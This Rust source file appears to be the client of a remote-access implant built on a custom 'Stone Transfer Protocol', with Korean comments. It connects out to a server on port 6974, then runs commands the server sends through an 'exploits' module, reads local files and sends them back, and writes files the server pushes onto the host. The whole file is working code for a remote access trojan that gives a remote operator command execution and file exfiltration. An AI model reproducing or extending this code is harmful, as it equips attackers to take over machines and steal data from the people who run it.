use std::{env, fs::File, net::Shutdown, io::{Read, Write}};
use std::ops::Add;
use bstr::ByteSlice;
use crate::exploits::{Exploits, HandleExploits};
use crate::stprotocol::{utils::Client, HandleProtocols, HandleSession, Session};
use crate::structure::{Detector, StoneTransferProtocol, StructStone};

impl Client {
    pub fn new(ip: &str) -> Client {
        Client {
            session: Session::new(format!("{}:{}", ip, 6974).as_str()),
            exploits: Exploits::default(),
        }
    }

    pub fn receiving(&mut self) -> &StructStone {
        self.session.receiving(StructStone::default())
    }

    pub fn send(&mut self, packet: StructStone) -> Result<(), ()> {
        self.session.get_packet().display();
        self.set_packet(packet);
        self.session.send()
    }
}

impl HandleProtocols for Client {
    fn default_protocol_handler(&mut self) -> Result<(), ()> {
        loop {
            // 새션 생성후 서버와 지속적인 통신을 위한 루프문
            match self.receiving().get_type() {
                StoneTransferProtocol::Connection => {
                    println!("Connection OK");
                    Ok(())
                }
                // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
                StoneTransferProtocol::ExecuteCmd =>
                // 타입이 ExecuteCmd 일 경우
                    self.exploit(),

                StoneTransferProtocol::Download =>
                // 타입이 Download 일 경우
                    self.download(),

                StoneTransferProtocol::Upload =>
                // 타입이 Upload 일 경우
                    self.upload(),

                StoneTransferProtocol::Disconnect => {
                    self.disconnect();
                    break Ok(());
                } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

                _ => self.send(StructStone::default()), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
            }?
        }
    }

    fn response(&mut self, msg: &str) -> Result<(), ()> {
        self.set_packet(crate::structure::response(msg));
        self.session.send()
    }

    fn disconnect(&mut self) {
        self.set_packet(crate::structure::disconnect());
        self.session.send().unwrap();
        self.session
            .take_socket()
            .shutdown(Shutdown::Both)
            .expect("TODO: panic message");
    }

    fn download(&mut self) -> Result<(), ()> {
        let path = match String::from_utf8(self.get_file()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let mut open_file = match File::open(path.replace("\\", "/")) {
            Ok(file) => file,
            Err(_) => return self.response("File Not Found"),
        };
        let mut file = vec![];

        match open_file.read(&mut file) {
            Ok(ok) => ok.to_le_bytes().to_vec(),
            Err(_) => return self.response("File Not Found"),
        };
        self.set_packet(crate::structure::download(file));
        self.session.send()
    }
    fn upload(&mut self) -> Result<(), ()> {
        let file_arr: &[u8] = self.take_file().as_slice();
        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();

        let path = format!(
            "{:?}/{:?}",
            env::current_dir().unwrap(),
            String::from_utf8(Vec::from(fields[0])).unwrap()
        )
            .replace('"', "")
            .replace("\\", "/");

        let mut open_file = match File::create(path.clone()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let file = match open_file.write_all(&mut fields[1]) {
            Ok(_) => format!("File {:?} upload successful", path)
                .as_bytes()
                .to_vec(),
            Err(_) => return self.response("File Not Found"),
        };

        self.set_packet(crate::structure::upload(file));
        self.session.send()
    }

    fn exploit(&mut self) -> Result<(), ()> {
        self.exploits.execute(self.get_command());
        let output = crate::structure::exploit(self.exploits.get_output());
        self.set_packet(output);
        self.session.send()
    }
}
